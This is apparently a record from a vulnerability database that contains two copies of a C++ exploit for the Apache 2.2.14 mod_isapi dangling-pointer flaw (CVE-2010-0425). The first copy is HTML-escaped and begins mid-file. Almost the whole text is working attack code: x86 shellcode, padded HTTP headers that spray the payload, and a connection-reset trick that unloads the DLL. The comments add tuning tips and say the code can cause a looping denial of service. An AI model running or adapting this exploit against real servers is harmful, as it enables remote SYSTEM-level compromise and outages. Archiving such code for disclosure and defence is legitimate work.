http://www.senseofsecurity.com.au\r\n */\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;windows.h&gt;\r\n#include &lt;winsock.h&gt;\r\n#include &lt;string&gt;\r\n#include &lt;direct.h&gt;\r\n\r\n#pragma comment(lib, &quot;wsock32.lib&quot;)\r\n\r\nusing namespace std;\r\n\r\n#define SERVER_PORT 80\r\n\r\nvoid header();\r\nint createConnection(string targetAddr, int targetPort);\r\nint sendTransmission(string message);\r\nstring recvTransmission();\r\nvoid cleanUp();\r\n\r\nWORD sockVersion;\r\nWSADATA wsaData;\r\n\r\nint sock;\r\nstruct sockaddr_in rserver;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tstring serverIP, isapiDLL;\r\n\tstring triggerVuln, payload;\r\n\tchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];\r\n\r\n\t//custom shellcode that writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; in the current working directory\r\n\t//Note: There are four NOPs at the end for padding. Not really needed. \r\n\tchar shellcode[] = &quot;\\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b&quot;\r\n\t\t\t\t\t   &quot;\\x7e\\x20\\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94&quot;\r\n\t\t\t\t\t   &quot;\\x6c\\x66\\x39\\x0f\\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24&quot;\r\n\t\t\t\t\t   &quot;\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3&quot;\r\n\t\t\t\t\t   &quot;\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1&quot;\r\n\t\t\t\t\t   &quot;\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66&quot;\r\n\t\t\t\t\t   &quot;\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61&quot;\r\n\t\t\t\t\t   &quot;\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\\x0c\\x01\\x66\\x81&quot;\r\n\t\t\t\t\t   &quot;\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\\xde\\xc3&quot;\r\n\t\t\t\t\t   &quot;\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b&quot;\r\n\t\t\t\t\t   &quot;\\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31&quot;\r\n\t\t\t\t\t   &quot;\\xd2\\x58\\x88\\x50\\x07\\xeb\\x2f\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2e\\x51\\x50\\xff&quot;\r\n\t\t\t\t\t   &quot;\\x55\\x04\\xeb\\x2c\\x31\\xd2\\x59\\x88\\x51\\x09\\xeb\\x33\\x51\\x50\\x89\\xc6\\xff\\x55&quot;\r\n\t\t\t\t\t   &quot;\\x08\\x53\\xff\\x55\\x0c\\xe8\\xd1\\xff\\xff\\xff\\x73\\x6f\\x73\\x2e\\x74\\x78\\x74\\x4e&quot;\r\n\t\t\t\t\t   &quot;\\xe8\\xcc\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcd\\xff\\xff\\xff\\xe8\\xcf\\xff\\xff\\xff\\x70&quot;\r\n\t\t\t\t\t   &quot;\\x77\\x6e\\x2d\\x69\\x73\\x61\\x70\\x69\\x4e\\xe8\\xc8\\xff\\xff\\xff\\x90\\x90\\x90\\x90&quot;;\r\n\r\n\theader();\r\n\r\n\tif (argc &lt; 3)\r\n\t{\r\n\t\tprintf(&quot;usage: %s &lt;ip&gt; &lt;DLL&gt;\\n&quot;, argv[0]);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tserverIP = string(argv[1]);\r\n\tisapiDLL = string(argv[2]);\r\n\r\n\t//all these values could be set to 7601 + sizeof(shellcode)\r\n\t//but mixing it up is good. \r\n\tmemset(accept, 'A', 170);\r\n\tmemset(referer, 'A', 732);\r\n\tmemset(cookie, 'A', 5375);\r\n\tmemset(random, 'A', 7603);\r\n\tmemset(postData, 'A', 23378);\r\n\tmemset(footer, 'A', 298);\r\n\r\n\ttriggerVuln = &quot;POST /cgi-bin/&quot; + isapiDLL + &quot; HTTP/1.0\\r\\n&quot;\r\n\t\t&quot;User-Agent: AAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Pragma: no-cache\\r\\n&quot;\r\n\t\t&quot;Proxy-Connection: Keep-Alive\\r\\n&quot;\r\n\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot;\r\n\t\t&quot;Content-Length: 40334\\r\\n\\r\\n&quot; +\r\n\t\tstring(footer);\r\n\r\n\t//Modify the below request if needed (depending on where your function pointer is pointing)\r\n\t//Do so by adding or removing headers. So if you want to hit a higher function pointer, \r\n\t//keep adding headers :) \r\n\t//Note: If performing this blindly, try it a few times, change a bit, try again. \r\n\t//During testing i found that using a chunk of data the same size with the same header name\r\n\t//was more unreliable. In memory, large amounts of nulls are being placed either side of the \r\n\t//payload. Since the function pointer address was random, by slightly mixing up the size of \r\n\t//each header i would get better results.\r\n\tpayload = &quot;POST /cgi-bin/&quot; + isapiDLL + &quot; HTTP/1.0\\r\\n&quot;\r\n\t\t&quot;Accept: &quot; + string(accept) + &quot;\\r\\n&quot;\r\n\t\t&quot;Referer: &quot; + string(referer) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;From: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Utruvh-guiergher: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Cookie: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot;\r\n\t\t&quot;Proxy-Connection: Keep-Alive\\r\\n&quot;\r\n\t\t&quot;Okytuasd: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Asdasdasdasdasd: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Asdasda: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Sewrwefbui: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Qdfasdernu: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Cdffew-asdf: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Kuiytnb-Ehrf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Lsfergjnuibubiu: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Baefrwerifnhu: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Zdsfno: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Psdfsafn: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Zefwefnuivre-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Ivre-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yvasde-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yuionbsdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yasdasdasdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;asdasdde-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Ertuioert-erf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Content-Length: 25054\\r\\n\\r\\n&quot; + \r\n\t\tstring(postData) + &quot;CCCC&quot; + string(shellcode) + &quot;BBBB&quot; + string(footer);\r\n\r\n\t//Setup connection\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(&quot;- an error occurred connecting to the server\\n&quot;);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tprintf(&quot;[+] Connected to %s.\\n&quot;, serverIP.c_str());\r\n\r\n\tprintf(&quot;[+] Setting socket data structure values\\n&quot;);\r\n\tint iOptVal;\r\n\tint aiOptVal;\r\n\t\r\n\tstruct linger linger_data;\r\n\t\r\n\t//This is meant to set closesocket to do a &quot;graceful close&quot;,\r\n\t//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is \r\n\t//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent. \r\n\tlinger_data.l_onoff = 0;\r\n\tlinger_data.l_linger = 0;\r\n\r\n\tsetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&amp;linger_data, sizeof(linger_data));\r\n\tsetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&amp;linger_data, sizeof(linger_data));\r\n\r\n\t//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent\r\n\tgetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&amp;linger_data, &amp;iOptVal);\r\n\tgetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&amp;linger_data, &amp;aiOptVal);\r\n\tprintf(&quot;    - SO_LINGER value is set to %ld\\n&quot;, linger_data.l_onoff);\r\n\tprintf(&quot;    - SO_DONTLINGER value is set to %ld\\n&quot;, linger_data.l_linger);\r\n\t\r\n\tprintf(&quot;[*] Triggering DLL unload\\n&quot;);\r\n\tsendTransmission(triggerVuln);\r\n\r\n\tSleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent. \r\n\tWSACancelBlockingCall(); //Cause reset packet response\r\n\r\n\tSleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...\r\n\tclosesocket(sock);\r\n\r\n\tSleep(2000);\r\n\tWSACleanup();\r\n\t\r\n\tSleep(2000);\r\n\tprintf(&quot;[+] The DLL should be unloaded by now\\n&quot;);\r\n\t\r\n\t//Reconnect to deliver payload\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(&quot;- an error occurred connecting to the server\\n&quot;);\r\n\t\treturn 1;\r\n\t}\r\n\t\r\n\tprintf(&quot;[*] Sending payload\\n&quot;);\r\n\tsendTransmission(payload);\r\n\r\n\tcleanUp();\r\n\r\n\tprintf(&quot;[+] Check to see if sos.txt was created...\\n&quot;);\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid header()\r\n{\r\n\tprintf(&quot;Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\\n&quot;);\r\n\tprintf(&quot;-------------------------------------------------------------\\n&quot;);\r\n\tprintf(&quot;         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\\n&quot;);\r\n\tprintf(&quot;                    Copyright Sense of Security Pty Ltd 2010.\\n&quot;);\r\n}\r\n\r\n//Setup the server\r\nint createConnection(string serverIP, int port)\r\n{\r\n\tint result = 0, len = 0;\r\n\r\n\tsockVersion = MAKEWORD(1,1);\r\n\tWSAStartup(sockVersion, &amp;wsaData);\r\n\t\r\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)\r\n\t{\r\n\t\tperror(&quot;error: socket()\\n&quot;);\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\trserver.sin_family = AF_INET;\r\n\trserver.sin_port = htons(port);\r\n\trserver.sin_addr.s_addr = inet_addr(serverIP.c_str());\r\n\tmemset(&amp;rserver.sin_zero, 0, 8);\r\n\r\n\tlen = sizeof(struct sockaddr_in);\r\n\t\r\n\tif ((connect(sock, (struct sockaddr *)&amp;rserver, sizeof(struct sockaddr_in))) == -1)\r\n\t{\r\n\t\tperror(&quot;error: connect()\\n&quot;);\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Send a message\r\nint sendTransmission(string message)\r\n{\r\n\tint bytes_sent = 0;\r\n\r\n\tbytes_sent = send(sock, message.c_str(), message.length(), 0);\r\n\tif (bytes_sent &lt; 0)\r\n\t{\r\n\t\tperror(&quot;error: send()\\n&quot;);\r\n\t\texit(1);\r\n\t}\r\n\t\r\n\treturn bytes_sent;\r\n}\r\n\r\n//Receive a message\r\nstring recvTransmission()\r\n{\r\n\tstring result;\r\n\tchar *c = new char[1];\r\n\tint bytes_recv = 0;\r\n\r\n\twhile (c[0] != NULL)\r\n\t{\r\n\t\tbytes_recv = recv(sock, c, 1, 0);\r\n\r\n\t\tif (bytes_recv &lt; 0)\r\n\t\t{\r\n\t\t\tperror(&quot;error: recv()\\n&quot;);\r\n\t\t\t//exit(1);\r\n\t\t}\r\n\r\n\t\tresult += c[0];\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Clean up the connection\r\nvoid cleanUp()\r\n{\r\n\tclosesocket(sock);\r\n\tWSACleanup();\r\n}\n                              ",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:19236"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2010-03-06T00:00:00",
            "published": "2010-03-06T00:00:00",
            "href": "https://packetstormsecurity.com/files/86964/Apache-2.2.14-mod_isapi-Remote-SYSTEM-Exploit.html",
            "id": "PACKETSTORM:86964",
            "type": "packetstorm",
            "title": "Apache 2.2.14 mod_isapi Remote SYSTEM Exploit",
            "sourceData": "`/*  \n* Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)  \n* ------------------------------------------------------------------------------  \n*  \n* Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002  \n*   \n* Description:  \n* pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.  \n* Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential   \n* Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause   \n* a constant DoS by looping this (since apache will automatically restart) :)  \n*  \n* Note that the exploit code may need to be run multiple times before a shell is spawned (70%  \n* success rate - tested on three different systems). Furthermore, the exploit code may require   \n* modification to exploit this vulnerability on different platforms. This is due to loaded memory   \n* references to the unloaded DLL (they will be different for each ISAPI module). Do not test  \n* this code in a VM otherwise the code may fail to send the RESET packet (something to do with  \n* VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want  \n* to have to use raw packets on Windows.   \n*  \n* Shellcode Note:   \n* The shellcode writes \"pwn-isapi\" to \"sos.txt\" which is created in the current working directory.   \n* Most operating systems should be supported by this shellcode. I've used Skylined's method of finding  \n* the base address of kernel32.dll for Windows 7 and modified it so that it will find the base   \n* address of msvcrt.dll instead. I've also added another check so that it will be able to detect  \n* \"msvcrt.dll\" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this  \n* DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of   \n* msvcrt.dll. So the added check will verify the presents of \"m\" before proceeding.   \n*  \n* Author:   \n* Brett Gervasoni (brettg [at] senseofsecurity.com.au)  \n*  \n* Copyright Sense of Security Pty Ltd 2010.   \n* http://www.senseofsecurity.com.au  \n*/  \n  \n#include <iostream>  \n#include <windows.h>  \n#include <winsock.h>  \n#include <string>  \n#include <direct.h>  \n  \n#pragma comment(lib, \"wsock32.lib\")  \n  \nusing namespace std;  \n  \n#define SERVER_PORT 80  \n  \nvoid header();  \nint createConnection(string targetAddr, int targetPort);  \nint sendTransmission(string message);  \nstring recvTransmission();  \nvoid cleanUp();  \n  \nWORD sockVersion;  \nWSADATA wsaData;  \n  \nint sock;  \nstruct sockaddr_in rserver;  \n  \nint main(int argc, char *argv[])  \n{  \nstring serverIP, isapiDLL;  \nstring triggerVuln, payload;  \nchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];  \n  \n//custom shellcode that writes \"pwn-isapi\" to \"sos.txt\" in the current working directory  \n//Note: There are four NOPs at the end for padding. Not really needed.   \nchar shellcode[] = \"\\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b\"  \n\"\\x7e\\x20\\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94\"  \n\"\\x6c\\x66\\x39\\x0f\\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24\"  \n\"\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\"  \n\"\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\"  \n\"\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\"  \n\"\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\"  \n\"\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\\x0c\\x01\\x66\\x81\"  \n\"\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\\xde\\xc3\"  \n\"\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b\"  \n\"\\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31\"  \n\"\\xd2\\x58\\x88\\x50\\x07\\xeb\\x2f\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2e\\x51\\x50\\xff\"  \n\"\\x55\\x04\\xeb\\x2c\\x31\\xd2\\x59\\x88\\x51\\x09\\xeb\\x33\\x51\\x50\\x89\\xc6\\xff\\x55\"  \n\"\\x08\\x53\\xff\\x55\\x0c\\xe8\\xd1\\xff\\xff\\xff\\x73\\x6f\\x73\\x2e\\x74\\x78\\x74\\x4e\"  \n\"\\xe8\\xcc\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcd\\xff\\xff\\xff\\xe8\\xcf\\xff\\xff\\xff\\x70\"  \n\"\\x77\\x6e\\x2d\\x69\\x73\\x61\\x70\\x69\\x4e\\xe8\\xc8\\xff\\xff\\xff\\x90\\x90\\x90\\x90\";  \n  \nheader();  \n  \nif (argc < 3)  \n{  \nprintf(\"usage: %s <ip> <DLL>\\n\", argv[0]);  \nreturn 1;  \n}  \n  \nserverIP = string(argv[1]);  \nisapiDLL = string(argv[2]);  \n  \n//all these values could be set to 7601 + sizeof(shellcode)  \n//but mixing it up is good.   \nmemset(accept, 'A', 170);  \nmemset(referer, 'A', 732);  \nmemset(cookie, 'A', 5375);  \nmemset(random, 'A', 7603);  \nmemset(postData, 'A', 23378);  \nmemset(footer, 'A', 298);  \n  \ntriggerVuln = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"  \n\"User-Agent: AAAAAAAA\\r\\n\"  \n\"Pragma: no-cache\\r\\n\"  \n\"Proxy-Connection: Keep-Alive\\r\\n\"  \n\"Host: \" + serverIP + \"\\r\\n\"  \n\"Content-Length: 40334\\r\\n\\r\\n\" +  \nstring(footer);  \n  \n//Modify the below request if needed (depending on where your function pointer is pointing)  \n//Do so by adding or removing headers. So if you want to hit a higher function pointer,   \n//keep adding headers :)   \n//Note: If performing this blindly, try it a few times, change a bit, try again.   \n//During testing i found that using a chunk of data the same size with the same header name  \n//was more unreliable. In memory, large amounts of nulls are being placed either side of the   \n//payload. Since the function pointer address was random, by slightly mixing up the size of   \n//each header i would get better results.  \npayload = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"  \n\"Accept: \" + string(accept) + \"\\r\\n\"  \n\"Referer: \" + string(referer) + string(shellcode) + \"\\r\\n\"  \n\"From: \" + string(cookie) + string(shellcode) + \"\\r\\n\"  \n\"Utruvh-guiergher: \" + string(cookie) + string(shellcode) + \"\\r\\n\"  \n\"Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"  \n\"Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"  \n\"UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"  \n\"Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"  \n\"User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"  \n\"Cookie: \" + string(cookie) + string(shellcode) + \"\\r\\n\"  \n\"Host: \" + serverIP + \"\\r\\n\"  \n\"Proxy-Connection: Keep-Alive\\r\\n\"  \n\"Okytuasd: \" + string(cookie) + string(shellcode) + \"\\r\\n\"  \n\"Asdasdasdasdasd: \" + string(random) + string(shellcode) + \"\\r\\n\"  \n\"Asdasda: \" + string(random) + string(shellcode) + \"\\r\\n\"  \n\"Sewrwefbui: \" + string(random) + string(shellcode) + \"\\r\\n\"  \n\"Qdfasdernu: \" + string(random) + string(shellcode) + \"\\r\\n\"  \n\"Cdffew-asdf: \" + string(random) + string(shellcode) + \"\\r\\n\"  \n\"Kuiytnb-Ehrf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Lsfergjnuibubiu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Baefrwerifnhu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Zdsfno: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Psdfsafn: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Zefwefnuivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Ivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Yvasde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Yuionbsdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Yasdasdasdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"asdasdde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Ertuioert-erf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"  \n\"Content-Length: 25054\\r\\n\\r\\n\" +   \nstring(postData) + \"CCCC\" + string(shellcode) + \"BBBB\" + string(footer);  \n  \n//Setup connection  \nif (createConnection(serverIP, SERVER_PORT) == 1)  \n{  \nprintf(\"- an error occurred connecting to the server\\n\");  \nreturn 1;  \n}  \n  \nprintf(\"[+] Connected to %s.\\n\", serverIP.c_str());  \n  \nprintf(\"[+] Setting socket data structure values\\n\");  \nint iOptVal;  \nint aiOptVal;  \n  \nstruct linger linger_data;  \n  \n//This is meant to set closesocket to do a \"graceful close\",  \n//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is   \n//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent.   \nlinger_data.l_onoff = 0;  \nlinger_data.l_linger = 0;  \n  \nsetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, sizeof(linger_data));  \nsetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, sizeof(linger_data));  \n  \n//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent  \ngetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, &iOptVal);  \ngetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, &aiOptVal);  \nprintf(\" - SO_LINGER value is set to %ld\\n\", linger_data.l_onoff);  \nprintf(\" - SO_DONTLINGER value is set to %ld\\n\", linger_data.l_linger);  \n  \nprintf(\"[*] Triggering DLL unload\\n\");  \nsendTransmission(triggerVuln);  \n  \nSleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent.   \nWSACancelBlockingCall(); //Cause reset packet response  \n  \nSleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...  \nclosesocket(sock);  \n  \nSleep(2000);  \nWSACleanup();  \n  \nSleep(2000);  \nprintf(\"[+] The DLL should be unloaded by now\\n\");  \n  \n//Reconnect to deliver payload  \nif (createConnection(serverIP, SERVER_PORT) == 1)  \n{  \nprintf(\"- an error occurred connecting to the server\\n\");  \nreturn 1;  \n}  \n  \nprintf(\"[*] Sending payload\\n\");  \nsendTransmission(payload);  \n  \ncleanUp();  \n  \nprintf(\"[+] Check to see if sos.txt was created...\\n\");  \n  \nreturn 0;  \n}  \n  \nvoid header()  \n{  \nprintf(\"Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\\n\");  \nprintf(\"-------------------------------------------------------------\\n\");  \nprintf(\" Brett Gervasoni (brettg [at] senseofsecurity.com.au)\\n\");  \nprintf(\" Copyright Sense of Security Pty Ltd 2010.\\n\");  \n}  \n  \n//Setup the server  \nint createConnection(string serverIP, int port)  \n{  \nint result = 0, len = 0;  \n  \nsockVersion = MAKEWORD(1,1);  \nWSAStartup(sockVersion, &wsaData);  \n  \nif ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)  \n{  \nperror(\"error: socket()\\n\");  \nresult = 1;  \n}  \n  \nrserver.sin_family = AF_INET;  \nrserver.sin_port = htons(port);  \nrserver.sin_addr.s_addr = inet_addr(serverIP.c_str());  \nmemset(&rserver.sin_zero, 0, 8);  \n  \nlen = sizeof(struct sockaddr_in);  \n  \nif ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1)  \n{  \nperror(\"error: connect()\\n\");  \nresult = 1;  \n}  \n  \nreturn result;  \n}  \n  \n//Send a message  \nint sendTransmission(string message)  \n{  \nint bytes_sent = 0;  \n  \nbytes_sent = send(sock, message.c_str(), message.length(), 0);  \nif (bytes_sent < 0)  \n{  \nperror(\"error: send()\\n\");  \nexit(1);  \n}  \n  \nreturn bytes_sent;  \n}  \n  \n//Receive a message  \nstring recvTransmission()  \n{  \nstring result;  \nchar *c = new char[1];  \nint bytes_recv = 0;  \n  \nwhile (c[0] != NULL)  \n{  \nbytes_recv = recv(sock, c, 1, 0);  \n  \nif (bytes_recv < 0)  \n{  \nperror(\"error: recv()\\n\");  \n//exit(1);  \n}  \n  \nresult += c[0];  \n}  \n  \nreturn result;  \n}  \n  